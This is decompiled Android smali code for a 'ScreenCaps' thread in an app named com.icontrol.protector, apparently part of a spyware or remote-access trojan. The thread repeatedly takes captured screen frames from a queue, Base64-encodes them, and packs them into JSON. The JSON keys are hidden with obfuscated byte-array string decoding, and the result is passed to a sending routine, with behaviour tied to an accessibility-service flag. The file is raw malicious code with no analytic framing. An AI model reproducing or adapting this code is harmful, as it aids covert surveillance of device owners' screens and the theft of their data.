.class Lcom/icontrol/protector/ScreenCaps$a$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/ScreenCaps$a;->f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/icontrol/protector/ScreenCaps$a;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/ScreenCaps$a;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps$a$a;->e:Lcom/icontrol/protector/ScreenCaps$a;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    :catch_0
    :goto_0
    :try_start_0
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    if-eqz v0, :cond_3

    :try_start_1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->x:Ljava/lang/Object;

    monitor-enter v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_2

    :try_start_2
    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->w:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v1

    const/4 v2, 0x0

    if-lez v1, :cond_0

    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->w:Ljava/util/List;

    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [B

    sget-object v3, Lcom/icontrol/protector/ScreenCaps;->w:Ljava/util/List;

    invoke-interface {v3, v2}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    goto :goto_1

    :catchall_0
    move-exception v1

    goto/16 :goto_2

    :cond_0
    const/4 v1, 0x0

    :goto_1
    monitor-exit v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-eqz v1, :cond_2

    const/4 v0, 0x1

    :try_start_3
    new-array v3, v0, [B

    const/16 v4, -0x7e

    aput-byte v4, v3, v2

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-boolean v5, Lcom/icontrol/protector/AccessServices;->z:Z

    if-eqz v5, :cond_1

    new-array v3, v0, [B

    const/16 v5, 0x18

    aput-byte v5, v3, v2

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    :cond_1
    invoke-static {v1, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    const/4 v6, 0x4

    new-array v7, v6, [B

    fill-array-data v7, :array_2

    new-array v8, v4, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x6

    new-array v8, v8, [B

    fill-array-data v8, :array_4

    new-array v9, v4, [B

    fill-array-data v9, :array_5

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v7, 0x3

    new-array v7, v7, [B

    fill-array-data v7, :array_6

    new-array v8, v4, [B

    fill-array-data v8, :array_7

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v6, [B

    fill-array-data v1, :array_8

    new-array v7, v4, [B

    fill-array-data v7, :array_9

    invoke-static {v1, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v5, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v6, [B

    fill-array-data v1, :array_a

    new-array v3, v4, [B

    fill-array-data v3, :array_b

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v0, v0, [B

    const/16 v3, -0x3b

    aput-byte v3, v0, v2

    new-array v2, v4, [B

    fill-array-data v2, :array_c

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v6, [B

    fill-array-data v0, :array_d

    new-array v1, v4, [B

    fill-array-data v1, :array_e

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/ScreenCaps$a$a;->e:Lcom/icontrol/protector/ScreenCaps$a;

    iget-object v1, v1, Lcom/icontrol/protector/ScreenCaps$a;->c:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v1}, Lcom/icontrol/protector/ScreenCaps;->d(Lcom/icontrol/protector/ScreenCaps;)I

    move-result v1

    invoke-virtual {v5, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    new-array v0, v6, [B

    fill-array-data v0, :array_f

    new-array v1, v4, [B

    fill-array-data v1, :array_10

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/ScreenCaps$a$a;->e:Lcom/icontrol/protector/ScreenCaps$a;

    iget-object v1, v1, Lcom/icontrol/protector/ScreenCaps$a;->c:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v1}, Lcom/icontrol/protector/ScreenCaps;->j(Lcom/icontrol/protector/ScreenCaps;)I

    move-result v1

    invoke-virtual {v5, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/ScreenCaps$a$a;->e:Lcom/icontrol/protector/ScreenCaps$a;

    iget-object v2, v1, Lcom/icontrol/protector/ScreenCaps$a;->c:Lcom/icontrol/protector/ScreenCaps;

    iget-object v1, v1, Lcom/icontrol/protector/ScreenCaps$a;->b:Landroid/content/Context;

    invoke-static {v2, v1, v0}, Lcom/icontrol/protector/ScreenCaps;->l(Lcom/icontrol/protector/ScreenCaps;Landroid/content/Context;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_3

    :catch_1
    :try_start_4
    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps$a$a;->e:Lcom/icontrol/protector/ScreenCaps$a;

    invoke-virtual {v0}, Lcom/icontrol/protector/ScreenCaps$a;->g()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_3

    :goto_2
    :try_start_5
    monitor-exit v0
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :try_start_6
    throw v1
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_2

    :catch_2
    :cond_2
    :goto_3
    const-wide/16 v0, 0x1

    :try_start_7
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_7} :catch_0
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto/16 :goto_0

    :catch_3
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_3
    return-void

    nop

    :array_0
    .array-data 1
        -0xbt
        -0x4ct
        -0x10t
        0x20t
        0x79t
        -0x42t
        -0x67t
        0x2et
    .end array-data

    :array_1
    .array-data 1
        0x68t
        -0x1dt
        0x30t
        -0x19t
        -0x7dt
        -0x18t
        -0x68t
        0x7et
    .end array-data

    :array_2
    .array-data 1
        -0x67t
        0x6t
        -0x21t
        0x30t
    .end array-data

    :array_3
    .array-data 1
        -0x13t
        0x7ft
        -0x51t
        0x55t
        -0x57t
        0xct
        0x45t
        -0x65t
    .end array-data

    :array_4
    .array-data 1
        -0x3t
        0x54t
        -0x20t
        -0x52t
        -0x77t
        -0x7bt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x72t
        0x37t
        -0x6et
        -0x35t
        -0x14t
        -0x15t
        -0x80t
        -0x67t
    .end array-data

    :array_6
    .array-data 1
        0x2bt
        0x47t
        -0x6ft
    .end array-data

    :array_7
    .array-data 1
        0x42t
        0x2at
        -0xat
        -0x51t
        0x5t
        -0x66t
        -0x69t
        0x54t
    .end array-data

    :array_8
    .array-data 1
        -0x61t
        -0x48t
        -0x12t
        -0x7t
    .end array-data

    :array_9
    .array-data 1
        -0x7t
        -0x36t
        -0x7dt
        -0x73t
        0x2ft
        0x1at
        -0x64t
        0x7at
    .end array-data

    :array_a
    .array-data 1
        -0x16t
        -0x3ft
        0x38t
        -0x76t
    .end array-data

    :array_b
    .array-data 1
        -0x67t
        -0x56t
        0x54t
        -0xdt
        0x7t
        0x54t
        0x9t
        0x22t
    .end array-data

    :array_c
    .array-data 1
        -0xbt
        -0x40t
        0x38t
        0x3at
        0x2dt
        -0x56t
        0x1ct
        -0x10t
    .end array-data

    :array_d
    .array-data 1
        0x75t
        0x1t
        0x27t
        -0x49t
    .end array-data

    :array_e
    .array-data 1
        0x2t
        0x6ct
        0x48t
        -0x2bt
        -0xdt
        -0x2dt
        0x7et
        -0x11t
    .end array-data

    :array_f
    .array-data 1
        0x6dt
        -0x5dt
        -0x5t
        0x4ft
    .end array-data

    :array_10
    .array-data 1
        0x5t
        -0x32t
        -0x6ct
        0x2dt
        0x40t
        0xft
        0x42t
        -0x6bt
    .end array-data
.end method
